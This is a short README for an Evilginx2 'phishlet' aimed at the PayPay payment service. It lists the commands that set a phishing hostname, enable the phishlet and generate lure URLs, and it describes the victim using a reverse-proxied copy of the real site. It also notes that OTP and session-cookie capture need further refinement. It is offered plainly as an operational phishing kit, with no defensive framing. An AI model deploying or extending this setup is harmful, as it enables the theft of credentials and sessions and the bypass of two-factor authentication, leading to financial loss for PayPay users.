# PayPay Evilginx2 Phishlet

Created from the `main` branch.

## Usage

1. Install Evilginx2
2. Place `phishlets/paypay.yaml` into your Evilginx2 phishlets directory
3. Set hostname and enable:
   ```
   phishlets hostname paypay your-domain.com
   phishlets enable paypay
   lures create paypay
   lures get-url 0
   ```

## Notes

This is a reverse-proxy approach. The victim interacts with a proxied version of the real PayPay site.
OTP flow and exact cookie names will need refinement after traffic analysis.
